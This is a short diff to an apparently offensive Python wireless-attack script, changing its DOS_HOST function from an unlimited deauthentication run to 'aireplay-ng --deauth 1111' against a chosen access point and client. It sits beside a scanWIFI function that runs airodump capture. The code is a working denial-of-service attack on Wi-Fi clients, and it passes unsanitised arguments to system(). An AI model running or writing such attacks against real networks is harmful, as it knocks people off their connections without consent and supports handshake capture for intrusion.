@@ -54,7 +54,7 @@ def scanWIFI(BSSID: str, channel: str, capDirectory: str, nic: str):
     system(airodump1)
 
 def DOS_HOST(BSSID: str, STATION: str, nic: str):
-    aireplay = f'aireplay-ng -0 0 -a {BSSID} -c {STATION} {nic}'
+    aireplay = f'aireplay-ng --deauth 1111 -a {BSSID} -c {STATION} {nic}'
     system(aireplay)
 
 if __name__ == '__main__':
